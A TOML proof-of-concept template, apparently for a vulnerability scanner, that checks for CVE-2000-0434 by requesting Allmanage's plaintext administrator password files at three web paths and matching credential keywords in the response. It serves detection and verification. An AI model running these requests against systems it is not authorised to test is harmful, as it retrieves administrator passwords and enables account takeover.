[info]
author = "ave"
description = "通过 HTTP GET 请求访问 Allmanage 网站管理软件存储明文密码的文件，验证是否存在密码泄露漏洞。Allmanage 将管理员密码以明文形式存储在 Web 可访问的文件中，远程攻击者无需认证即可获取管理员密码。"
id = "POC-AVE-2000-0472"
name = "CVE-2000-0434 Allmanage 管理员密码明文泄露 PoC"
severity = "high"
tags = ["ave-2000-0472"]
vuln_id = [
    "CVE-2000-0434",
    "AVE-2000-0472",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/allmanage.pass"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "pass",
    "admin",
    "password",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/allmanage.pass"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "pass",
    "admin",
    "password",
]

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/allmanage/admin.pass"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "pass",
    "admin",
    "password",
]
